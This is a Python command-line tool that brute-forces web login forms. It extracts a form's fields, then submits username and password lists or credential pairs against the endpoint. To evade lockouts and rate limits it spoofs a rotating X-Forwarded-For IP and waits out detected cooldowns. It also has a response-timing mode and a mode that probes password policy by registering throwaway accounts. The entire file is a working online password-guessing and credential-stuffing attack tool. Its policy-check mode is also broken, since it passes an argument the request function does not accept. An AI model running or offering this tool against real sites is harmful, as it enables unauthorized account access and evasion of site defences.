import string
import random
from bs4 import BeautifulSoup
import time
import requests
import sys
import xml.etree.ElementTree as ET
import base64
import argparse
import re
from urllib.parse import urlparse
import os
import collections
collections.Callable = collections.abc.Callable

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

ip_address = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
request_num = 0
usernames_alts = ["username", "user", "login", "uname", "userid", "u", "login_id", "account", "signin", "customer_id",
                  "member_id", "UserName","user_id", "userID", "account_id", "login_name", "login_username", "user_login", "user_name"]
passwords_alts = ["password", "pass", "pwd", "pswd", "secret", "passphrase", "code", "pin", "security_code", "auth_token", "login_password", "user_password", "passwd", "passwd1",
                  "passwd2", "login_pass", "user_pass", "password1", "password2", "password_confirmation", "pwd_confirm", "passwd_confirm", "confirm_pwd", "confirm_pass", "verify_password"]
policy_check_passwords = ["!@#$%", "123456", "qwerty", "QWERTY", "qwerty!", "1234!a", "qwerty1", "Qwerty", "QWERTY1", "QWERTY!", "qwertY1", "Qwert1!"]


def analyze_password_policy(passwords):
    policy = {
        "requires_upper": True,
        "requires_lower": True,
        "requires_digit": True,
        "requires_special": True,
    }

    for password, status in passwords.items():
        if status == "ALLOWED":
            # If an allowed password lacks a certain character type, then that type is not required
            if not any(c.isupper() for c in password):
                policy["requires_upper"] = False
            if not any(c.islower() for c in password):
                policy["requires_lower"] = False
            if not any(c.isdigit() for c in password):
                policy["requires_digit"] = False
            if not any(c in string.punctuation for c in password):
                policy["requires_special"] = False

    return policy


# Regex pattern to find waiting times
time_pattern = r'\b(\d+(\.\d+)?) seconds\b'

# Keywords or phrases indicating a wait
wait_keywords = [
    "please wait",
    "waiting time",
    "requires",
    "cooldown period",
    "retry after",
    "hold for",
    "mandatory pause",
    "please allow",
    "available in"
]


def extract_valid_waiting_times(page_content):
    # Check if any of the wait keywords are present in the message
    if any(keyword in page_content for keyword in wait_keywords):
        # If a wait keyword is found, extract the time
        matches = re.findall(time_pattern, page_content)
        if matches:
            return float(matches[0][0])


def replace_parameters_in_request(post_data):
    # Ersetze den Wert des Benutzernamens
    for uname_alt in usernames_alts:
        post_data = re.sub(r'(\b'+uname_alt+'=)([^&]*)', r'\1BUSER', post_data)
    # Ersetze den Wert des Passworts
    for p_alt in passwords_alts:
        post_data = re.sub(r'(\b'+p_alt+'=)([^&]*)', r'\1BPASS', post_data)
    post_data = re.sub(r'(\bemail=)([^&]*)', r'\1BEMAIL', post_data)
    return post_data


def extract_form_data(url):
    print(f"[+] Extracting form data from {url}")

    # Send HTTP request to the page
    response = requests.get(url, headers={"X-Forwarded-For": get_next_ip(), **headers}, cookies=custom_cookies)
    if not response or response.status_code != 200:
        print("[-] Error: Unable to fetch page.")
        exit()

    # Use BeautifulSoup to parse the HTML page
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the first form on the page
    form = soup.find('form')
    if not form:
        print("[-] Error: No form found on the page.")
        exit()

    # Extract input fields from the form
    form_data = {
        'action': form.get('action', ''),
        'method': form.get('method', 'POST').upper(),
        'post_data': ""
    }

    for input_tag in form.find_all('input'):
        # For each input, store its name, type, and default value if any
        form_data["post_data"] += input_tag.get('name', "")+"="+input_tag.get('value', '')+"&"
    for button in form.find_all('button', attrs={'type': 'submit'}):
        if button.get('name'):
            form_data["post_data"] += button.get('name')+"="+button.get('value', '')+"&"
    form_data["post_data"] = form_data["post_data"].rstrip("&")

    return form_data


def get_next_ip():
    global ip_address
    if ip_address == "255.255.255.255":
        return "1.1.1.1"

    octets = [int(octet) for octet in ip_address.split('.')]

    # Increment the last octet
    octets[-1] += 1

    # Handle carry-over for each octet
    for i in range(len(octets) - 1, 0, -1):
        if octets[i] > 255:
            octets[i] = 0
            octets[i-1] += 1

    # Join the incremented octets back into a string
    ip_address = '.'.join(str(octet) for octet in octets)
    return ip_address


def sendRequest(username, password, retry=False):
    if password == "none":
        password = ""
    post_data = post_data_template.replace("BUSER", username).replace("BPASS", password)
    start_time = time.time()

    try:
        response = requests.post(url, data=post_data, headers={"X-Forwarded-For": get_next_ip(), **headers}, cookies=custom_cookies)
        global request_num
        request_num += 1

        waiting_time = extract_valid_waiting_times(response.text)
        if waiting_time:
            print(f"[!] Waiting time detected: Sleeping {waiting_time} seconds")
            time.sleep(waiting_time+1)
            return sendRequest(username, password, retry=True)

        if sleep_time:
            time.sleep(sleep_time)
        if time_mode:
            print(response.status_code, username, time.time() - start_time)
        elif check_policy_mode:
            if fail_string in response.text:
                print(response.status_code, password, "NOT ALLOWED")
                return False
            else:
                print(response.status_code, password, "ALLOWED")
                return True

        elif fail_string and not fail_string.replace("BUSER", username) in response.text:
            print("----------------------------")
            print("NO fail_string found for: ", username, password)
            if password in first_entries and passwords_path or (username in first_entries and usernames_path):
                print("--> FIRST ENTRY HIT DETECTED: Modify Fail String")
            print("----------------------------")
            exit()
        elif success_string and success_string.replace("BUSER", username) in response.text:
            print("----------------------------")
            print("SUCCESS_string found for: ", username, password)
            if password in first_entries and passwords_path or (username in first_entries and usernames_path):
                print("--> FIRST ENTRY HIT DETECTED: Modify Success String")
            print("----------------------------")
            exit()
        else:
            print(request_num, response.status_code, post_data)

    except Exception as e:
        if retry:
            print("FAILED", u, "Error:", str(e))
        else:
            print(f"[!] Error occured for {post_data}: Submitting Retry..")
            return sendRequest(username, password, retry=True)


parser = argparse.ArgumentParser(description="Post Form Brute Forcer")
parser.add_argument("target", type=str, help="URL or path to request file")
parser.add_argument("-f", "--fail_string", type=str, help="String to search in invalid request")
parser.add_argument("-s", "--success_string", type=str, help="String to search in valid request")
parser.add_argument("-p", "--password", type=str, help="single password")
parser.add_argument("-l", "--username", type=str, help="single username")
parser.add_argument("-P", "--passlist", type=str, help="Path to passlist file")
parser.add_argument("-L", "--userlist", type=str, help="Path to userlist file")
parser.add_argument("-C", "--passpairs", type=str, help="Path to username:pass pairs list")
parser.add_argument("--cookies", type=str, help="Add custom cookies (comma seperated)")
parser.add_argument("--sleep", type=int, help="Time to sleep after each request")
parser.add_argument("--time", action='store_true', help="Activate response time analysis")
parser.add_argument("--check-policy", "-check_policy", action='store_true', help="Activate register passwords policy checking")

args = parser.parse_args()
target = args.target
password = args.password
username = args.username
passwords_path = args.passlist
usernames_path = args.userlist
passpairs_path = args.passpairs
custom_cookies = args.cookies
if custom_cookies:
    custom_cookies = {c.split("=")[0]: c.split("=")[1] for c in custom_cookies.split(",")}
print(custom_cookies)
fail_string = args.fail_string
success_string = args.success_string
sleep_time = args.sleep
time_mode = args.time
check_policy_mode = args.check_policy

if target.startswith("http://") or target.startswith("https://"):
    form_data = extract_form_data(target)
    post_data_template = form_data["post_data"]
    post_data_template = replace_parameters_in_request(post_data_template)
    path = form_data["action"]
    method = form_data["method"]
    # Parse the URL
    parsed_url = urlparse(target)
    url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    print(url)
    if not target.endswith(path):
        url = url + path

elif os.path.exists(target):
    # Parse the XML file
    tree = ET.parse(target)
    root = tree.getroot()

    # Extract the necessary data from the XML
    url = root.find(".//url").text.strip()
    request_base64 = root.find(".//request").get("base64").strip()
    request_data = root.find(".//request").text.strip()

    # Decode the request data if it's in base64 format
    if request_base64.lower() == "true":
        request_data = base64.b64decode(request_data).decode()

    # Extract the last line of the request_data (the POST data)
    post_data_template = request_data.splitlines()[-1]
else:
    print("[-] NO valid URL or request file given")
    exit()

if (passwords_path or passpairs_path) and "BPASS" not in post_data_template:
    print("[-] NO BPASS variable set in post data")
    exit()

if usernames_path and "BUSER" not in post_data_template:
    print("[-] NO BUSER variable set in post data")
    exit()

print("[+] Extracted post data with brute parameters:", post_data_template)

if time_mode:
    print("[+] time mode only active")
else:
    if not fail_string and not success_string:
        print("[-] No fail_string or success_string set. Set with -f or -s")
        exit()
    elif fail_string:
        print("[+] fail_string is:", fail_string)
    elif success_string:
        print("[+] success_string is:", success_string)

if check_policy_mode:
    print("[+] check policy mode active")
    pass_min_length = 4
    while pass_min_length < 25:
        try:
            u = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            p = "Ab1!"+"A"*(pass_min_length-4)
            if sendRequest(u, p, email=u+"@gmail.com"):
                break
            else:
                pass_min_length += 1
        except Exception as e:
            print("FAILED", p, "Error:", str(e))

    pass_policy_check_dict = {}
    for p in policy_check_passwords:
        try:
            while len(p) < pass_min_length:
                p += p[0]
            u = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            if sendRequest(u, p, email=u+"@gmail.com"):
                pass_policy_check_dict[p] = "ALLOWED"
            else:
                pass_policy_check_dict[p] = "NOT ALLOWED"
        except Exception as e:
            print("FAILED", p, "Error:", str(e))
    print("--------------------------------------------------")
    print("[+] Min Password length is ", pass_min_length)
    if pass_min_length == 4:
        print("[!] Passwort length is 4. Less could be possible!")
    pass_policy = analyze_password_policy(pass_policy_check_dict)
    for entry, value in pass_policy.items():
        print(entry, value)
    print("--------------------------------------------------")
    exit()


if passpairs_path:
    with open(passpairs_path) as file:
        passpairs = file.read().splitlines()
    print("[+] Starting to attack endpoint:", url)
    for pair in passpairs:
        splitpair = pair.split(":")
        u = splitpair[0]
        p = splitpair[1]
        sendRequest(u, p)

    exit()

usernames = [username] if username else []
passwords = [password] if password else []

if usernames_path:
    with open(usernames_path) as file:
        usernames = file.read().splitlines()

if passwords_path:
    with open(passwords_path) as file:
        passwords = file.read().splitlines()

first_entries = []
if passwords:
    first_entries.append(passwords[0])

if usernames:
    first_entries.append(usernames[0])


if not usernames:
    print("[-] BUSER is set but usernames list is empty. Set with -L / -l")
    sys.exit(1)
if not passwords:
    if "BPASS" in post_data_template:
        print("[-] BPASS is set but passwords list is empty. Set with -P/ -p")
        sys.exit(1)
    passwords = [""]

print("[+] Starting to attack endpoint:", url)
for u in usernames:
    for p in passwords:
        sendRequest(u, p)
